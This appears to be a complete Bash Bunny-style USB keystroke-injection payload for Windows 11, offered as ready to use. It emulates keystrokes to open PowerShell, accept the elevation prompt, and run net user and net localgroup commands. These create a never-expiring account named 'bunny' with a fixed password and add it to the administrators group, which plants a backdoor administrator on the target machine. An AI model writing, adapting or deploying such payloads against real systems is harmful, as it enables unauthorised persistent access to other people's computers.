# Title: Win_AdminUser
# Description: This payload helps you create an admin user on any Windows system using PowerShell.
# Author: Gopalsamy Rajendran
# Target: Windows 11 - Latest
# Version 1.0
# Dependencies: The current logged-in user must be an admin user.

#Attack
LED ATTACK
ATTACKMODE HID STORAGE

#Opens Powershell as admin user
Q GUI
Q DELAY 400
Q STRING powershell
Q DELAY 400
Q CTRL-SHIFT ENTER
Q DELAY 300
Q LEFTARROW
Q DELAY 300
Q ENTER

#Create new user and add the created user to the admin group
Q DELAY 400
Q STRING "net user bunny P@$$w0rd /add /expires:never"
Q ENTER
Q DELAY 200
Q STRING "net localgroup administrators bunny /add"
Q ENTER
Q STRING "exit"
Q ENTER

LED FINISH
